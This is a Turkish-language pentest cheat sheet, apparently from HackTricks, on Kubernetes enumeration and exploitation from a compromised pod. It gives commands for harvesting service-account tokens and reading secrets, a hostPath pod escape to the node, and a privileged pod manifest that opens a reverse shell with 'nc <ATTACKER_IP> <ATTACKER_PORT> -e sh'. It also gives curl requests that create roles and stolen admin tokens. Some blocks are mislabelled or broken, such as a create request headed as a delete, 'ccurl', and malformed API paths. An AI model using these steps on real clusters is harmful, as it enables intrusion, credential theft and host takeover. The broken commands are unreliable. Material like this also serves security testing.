# Kubernetes Enumeration

{{#include ../../banners/hacktricks-training.md}}

## Kubernetes Tokens

Eğer bir makineye erişiminiz varsa, kullanıcı bazı Kubernetes platformlarına erişim sağlayabilir. Token genellikle **env var `KUBECONFIG`** tarafından işaret edilen bir dosyada veya **`~/.kube`** içinde bulunur.

Bu klasörde **API sunucusuna bağlanmak için token ve yapılandırmalar içeren** yapılandırma dosyaları bulabilirsiniz. Bu klasörde ayrıca daha önce alınan bilgileri içeren bir önbellek klasörü de bulabilirsiniz.

Eğer bir Kubernetes ortamında bir pod'u ele geçirdiyseniz, token ve mevcut K8 ortamı hakkında bilgi bulabileceğiniz başka yerler de vardır:

### Service Account Tokens

Devam etmeden önce, Kubernetes'te bir servisin ne olduğunu bilmiyorsanız, **bu bağlantıyı takip etmenizi ve en azından Kubernetes mimarisi hakkında bilgi okumanızı öneririm.**

Kubernetes [belgelerinden](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) alınmıştır:

_“Bir pod oluşturduğunuzda, eğer bir hizmet hesabı belirtmezseniz, otomatik olarak aynı ad alanındaki_ default _hizmet hesabına atanır.”_

**ServiceAccount**, Kubernetes tarafından yönetilen ve bir pod içinde çalışan süreçler için bir kimlik sağlamak amacıyla kullanılan bir nesnedir.\
Her hizmet hesabının ona bağlı bir sırrı vardır ve bu sır, bir bearer token içerir. Bu, iki taraf arasında talepleri güvenli bir şekilde temsil etmenin bir yolu olan JSON Web Token (JWT) 'dir.

Genellikle **bir** dizin:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccount`

aşağıdaki dosyaları içerir:

- **ca.crt**: Kubernetes iletişimlerini kontrol etmek için CA sertifikasıdır.
- **namespace**: Mevcut ad alanını belirtir.
- **token**: Mevcut pod'un **hizmet token'ını** içerir.

Artık token'ınız olduğuna göre, API sunucusunu **`KUBECONFIG`** ortam değişkeni içinde bulabilirsiniz. Daha fazla bilgi için `(env | set) | grep -i "kuber|kube`**`"`** komutunu çalıştırın.

Hizmet hesabı token'ı, **sa.key** dosyasında bulunan anahtar ile imzalanır ve **sa.pub** tarafından doğrulanır.

**Kubernetes** üzerindeki varsayılan konum:

- /etc/kubernetes/pki

**Minikube** üzerindeki varsayılan konum:

- /var/lib/localkube/certs

### Hot Pods

_**Hot pods,**_ ayrıcalıklı bir hizmet hesabı token'ı içeren pod'lardır. Ayrıcalıklı bir hizmet hesabı token'ı, gizli bilgileri listeleme, pod oluşturma gibi ayrıcalıklı görevleri yapma iznine sahip bir token'dır.

## RBAC

Eğer **RBAC**'ın ne olduğunu bilmiyorsanız, **bu bölümü okuyun**.

## GUI Applications

- **k9s**: Terminalden bir Kubernetes kümesini listeleyen bir GUI. Komutları kontrol etmek için [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/) adresine bakın. `:namespace` yazın ve ardından tüm ad alanlarındaki kaynakları aramak için hepsini seçin.
- **k8slens**: Birkaç gün ücretsiz deneme sunar: [https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

Bir K8s ortamını listelemek için şunlara ihtiyacınız var:

- **geçerli bir kimlik doğrulama token'ı**. Önceki bölümde bir kullanıcı token'ı ve bir hizmet hesabı token'ı için nerede arama yapacağımızı gördük.
- **Kubernetes API'sinin adresi** (_**https://host:port**_). Bu genellikle ortam değişkenlerinde ve/veya kube yapılandırma dosyasında bulunabilir.
- **Opsiyonel**: **API sunucusunu doğrulamak için ca.crt**. Bu, token'ın bulunabileceği aynı yerlerde bulunabilir. API sunucusu sertifikasını doğrulamak için yararlıdır, ancak `kubectl` ile `--insecure-skip-tls-verify` veya `curl` ile `-k` kullanarak buna ihtiyacınız olmayacaktır.

Bu detaylarla **kubernetes'i listeleyebilirsiniz**. Eğer **API** bir nedenle **İnternet** üzerinden **erişilebilir** ise, bu bilgiyi indirip platformu kendi makinenizden listeleyebilirsiniz.

Ancak genellikle **API sunucusu dahili bir ağdadır**, bu nedenle ona erişmek için ele geçirilmiş makine üzerinden **bir tünel oluşturmanız** gerekecektir veya **kubectl** [**binary'sini**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) yükleyebilir veya **`curl/wget/anything`** kullanarak API sunucusuna ham HTTP istekleri gönderebilirsiniz.

### `list` ve `get` fiilleri arasındaki farklar

**`get`** izinleri ile belirli varlıkların bilgilerine erişebilirsiniz (_`kubectl`'deki `describe` seçeneği_):
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Eğer **`list`** iznine sahipseniz, bir tür varlığı listelemek için API istekleri yapmanıza izin verilir (_`kubectl`'deki `get` seçeneği_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Eğer **`watch`** iznine sahipseniz, varlıkları izlemek için API istekleri yapmanıza izin verilir:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Bir değişiklik olduğunda (veya yeni bir tane oluşturulduğunda) size bir Deployment'ın tam manifestosunu döndüren bir akış bağlantısı açarlar.

> [!CAUTION]
> Aşağıdaki `kubectl` komutları, nesneleri listelemenin sadece nasıl yapılacağını gösterir. Verilere erişmek istiyorsanız `get` yerine `describe` kullanmalısınız.

### curl Kullanarak

Bir podun içinden birkaç ortam değişkeni kullanabilirsiniz:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
> [!WARNING]
> Varsayılan olarak pod, **kube-api sunucusuna** **`kubernetes.default.svc`** alan adı üzerinden **erişebilir** ve burada kubernetes DNS sunucusunun adresini bulacağınız **`/etc/resolv.config`** dosyasında kube ağını görebilirsiniz (aynı aralıktaki ".1" kube-api uç noktasıdır).

### kubectl Kullanımı

Token ve API sunucusunun adresine sahip olduğunuzda, buradaki gibi erişmek için kubectl veya curl kullanabilirsiniz:

Varsayılan olarak, APISERVER `https://` şeması ile iletişim kurmaktadır.
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
> Eğer URL'de `https://` yoksa, Bad Request gibi bir hata alabilirsiniz.

Aşağıda, erişim sağladığınız yeni K8s'i sıralı bir şekilde enumerate etmek ve anlamak için farklı seçenekleri sunmak amacıyla yazılmıştır.

`kubectl`'nin gönderdiği HTTP isteğini bulmak için `-v=8` parametresini kullanabilirsiniz.

#### MitM kubectl - kubectl'yi Proxy'leme
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Mevcut Konfigürasyon

{{#tabs }}
{{#tab name="Kubectl" }}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{{#endtab }}
{{#endtabs }}

Eğer bazı kullanıcıların kimlik bilgilerini çalmayı başardıysanız, bunları **yerel olarak yapılandırabilirsiniz** şöyle bir şey kullanarak:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Desteklenen Kaynakları Al

Bu bilgilerle listeleyebileceğiniz tüm hizmetleri bileceksiniz

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{{#endtab }}
{{#endtabs }}

### Mevcut Yetkileri Al

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{{#endtab }}
{{#endtabs }}

Yetkilerinizi kontrol etmenin bir diğer yolu, aracı kullanmaktır: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

**Kubernetes RBAC** hakkında daha fazla bilgi edinebilirsiniz:

{{#ref}}
kubernetes-role-based-access-control-rbac.md
{{#endref}}

**Hangi yetkilere sahip olduğunuzu öğrendikten sonra**, yetkileri yükseltmek için **bunları kötüye kullanıp kullanamayacağınızı** öğrenmek için aşağıdaki sayfayı kontrol edin:

{{#ref}}
abusing-roles-clusterroles-in-kubernetes/
{{#endref}}

### Diğer Rolleri Alın

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get roles
k get clusterroles
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{{#endtab }}
{{#endtabs }}

### Ad alanlarını al

Kubernetes, aynı fiziksel küme tarafından desteklenen **birden fazla sanal küme**'yi destekler. Bu sanal kümelere **ad alanları** denir.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get namespaces
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{{#endtab }}
{{#endtabs }}

### Gizli Anahtarları Al

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{{#endtab }}
{{#endtabs }}

Eğer gizli bilgileri okuyabiliyorsanız, her bir token ile ilgili ayrıcalıkları almak için aşağıdaki satırları kullanabilirsiniz:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Hizmet Hesaplarını Al

Bu sayfanın başında tartışıldığı gibi **bir pod çalıştırıldığında genellikle ona bir hizmet hesabı atanır**. Bu nedenle, hizmet hesaplarını, izinlerini ve nerede çalıştıklarını listelemek, bir kullanıcının ayrıcalıkları artırmasına olanak tanıyabilir.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get serviceaccounts
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{{#endtab }}
{{#endtabs }}

### Dağıtımları Al

Dağıtımlar, **çalıştırılması** gereken **bileşenleri** belirtir.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get deployments
k get deployments -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{{#endtab }}
{{#endtabs }}

### Podları Al

Podlar, **çalışacak** olan gerçek **konteynerlerdir**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get pods
k get pods -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{{#endtab }}
{{#endtabs }}

### Servisleri Al

Kubernetes **servisleri**, **belirli bir port ve IP'de bir servisi açmak için** kullanılır (bu, aslında servisi sunan pod'lara yük dengeleyici olarak işlev görecektir). Bu, saldırmayı denemek için diğer servisleri nerede bulabileceğinizi bilmek açısından ilginçtir.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get services
k get services -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{{#endtab }}
{{#endtabs }}

### Düğümleri Al

**Küme içinde yapılandırılmış tüm düğümleri** al.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get nodes
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{{#endtab }}
{{#endtabs }}

### DaemonSet'leri Al

**DaemonSet'ler**, **belirli bir pod'un kümenin tüm düğümlerinde** (veya seçilenlerde) çalıştığını sağlamaya olanak tanır. DaemonSet'i silerseniz, onun tarafından yönetilen pod'lar da kaldırılacaktır.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get daemonsets
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{{#endtab }}
{{#endtabs }}

### Cronjob Al

Cron işleri, belirli bir eylemi gerçekleştirecek bir pod'un başlatılmasını crontab benzeri bir sözdizimi kullanarak planlamaya olanak tanır.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get cronjobs
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{{#endtab }}
{{#endtabs }}

### configMap Al

configMap her zaman kubernetes'te çalışan uygulamalara sağlanan birçok bilgi ve yapılandırma dosyası içerir. Genellikle, diğer iç/dış hizmetlere bağlanmak ve doğrulamak için kullanılan birçok şifre, gizli anahtar ve token bulabilirsiniz.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get configmaps # -n namespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{{#endtab }}
{{#endtabs }}

### Ağ Politikalarını Al / Cilium Ağ Politikaları

{{#tabs }}
{{#tab name="İlk Sekme" }}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{{#endtab }}
{{#endtabs }}

### Her Şeyi Al / Tüm

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all
```
{{#endtab }}
{{#endtabs }}

### **Helm tarafından yönetilen tüm kaynakları al**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{{#endtab }}
{{#endtabs }}

### **Pod Tüketimlerini Al**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k top pod --all-namespaces
```
{{#endtab }}
{{#endtabs }}

## Küme ile kubectl kullanmadan etkileşim kurma

Kubernetes kontrol düzleminin bir REST-ful API sunduğunu görebildiğiniz için, HTTP isteklerini el ile oluşturabilir ve bunları **curl** veya **wget** gibi diğer araçlarla gönderebilirsiniz.

### Pod'dan kaçış

Yeni pod'lar oluşturabiliyorsanız, bunlardan düğüme kaçış yapabilirsiniz. Bunu yapmak için bir yaml dosyası kullanarak yeni bir pod oluşturmanız, oluşturulan pod'a geçiş yapmanız ve ardından düğümün sistemine chroot yapmanız gerekir. Mevcut görüntüleri ve yolları gösterdikleri için yaml dosyası için referans olarak zaten var olan pod'ları kullanabilirsiniz.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Eğer belirli bir düğümde pod oluşturmanız gerekiyorsa, düğüm üzerindeki etiketleri almak için aşağıdaki komutu kullanabilirsiniz.
>
> `k get nodes --show-labels`
>
> Genellikle, kubernetes.io/hostname ve node-role.kubernetes.io/master, seçim için iyi etiketlerdir.

Sonra attack.yaml dosyanızı oluşturursunuz.
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
Bundan sonra pod'u oluşturursunuz.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Artık oluşturulan pod'a aşağıdaki gibi geçiş yapabilirsiniz
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Ve sonunda node'un sistemine chroot edersiniz.
```bash
chroot /root /bin/bash
```
Bilgi alındı: [Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

### Ayrıcalıklı bir pod oluşturma

İlgili yaml dosyası aşağıdaki gibidir:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: everything-allowed-exec-pod
labels:
app: pentest
spec:
hostNetwork: true
hostPID: true
hostIPC: true
containers:
- name: everything-allowed-pod
image: alpine
securityContext:
privileged: true
volumeMounts:
- mountPath: /host
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "nc <ATTACKER_IP> <ATTACKER_PORT> -e sh" ]
#nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
volumes:
- name: noderoot
hostPath:
path: /
```
Pod'u curl ile oluşturun:
```bash
CONTROL_PLANE_HOST=""
TOKEN=""

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 478' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"labels\":{\"app\":\"pentest\"},\"name\":\"everything-allowed-exec-pod\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"args\":[\"nc <ATTACKER_IP> <ATTACKER_PORT> -e sh\"],\"command\":[\"/bin/sh\",\"-c\",\"--\"],\"image\":\"alpine\",\"name\":\"everything-allowed-pod\",\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"noderoot\"}]}],\"hostIPC\":true,\"hostNetwork\":true,\"hostPID\":true,\"volumes\":[{\"hostPath\":{\"path\":\"/\"},\"name\":\"noderoot\"}]}}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Bir pod'u sil

curl ile bir pod'u sil:
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
POD_NAME="everything-allowed-exec-pod"

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/default/pods/$POD_NAME"
```
### Bir Hizmet Hesabı Oluşturun
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"


curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Length: 109' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"ServiceAccount\",\"metadata\":{\"name\":\"secrets-manager-sa-2\",\"namespace\":\"default\"}}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/serviceaccounts?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Bir Hizmet Hesabını Silme
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
SA_NAME=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 35' -H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/serviceaccounts/$SA_NAME"
```
### Bir Rol Oluşturun
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"


curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'Accept: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 203' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"Role\",\"metadata\":{\"name\":\"secrets-manager-role\",\"namespace\":\"default\"},\"rules\":[{\"apiGroups\":[\"\"],\"resources\":[\"secrets\"],\"verbs\":[\"get\",\"create\"]}]}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Bir Rolü Sil
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
ROLE_NAME=""

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles/$ROLE_NAME"
```
### Bir Rol Bağlantısı Oluşturun
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 816' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"RoleBinding\",\"metadata\":{\"name\":\"secrets-manager-role-binding\",\"namespace\":\"default\"},\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"Role\",\"name\":\"secrets-manager-role\"},\"subjects\":[{\"apiGroup\":\"\",\"kind\":\"ServiceAccount\",\"name\":\"secrets-manager-sa\",\"namespace\":\"default\"}]}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/$NAMESPACE/default/rolebindings?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Bir Rol Bağlantısını Silme
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
ROLE_BINDING_NAME=""

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/rolebindings/$ROLE_BINDING_NAME"
```
### Bir Sırrı Sil
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 219' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"cluster-admin-sa\"},\"name\":\"stolen-admin-sa-token\",\"namespace\":\"default\"},\"type\":\"kubernetes.io/service-account-token\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/$NAMESPACE/default/secrets?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Bir Sırrı Sil
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
SECRET_NAME=""

ccurl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'Accept: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/secrets/$SECRET_NAME"
```
## Referanslar

{{#ref}}
https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
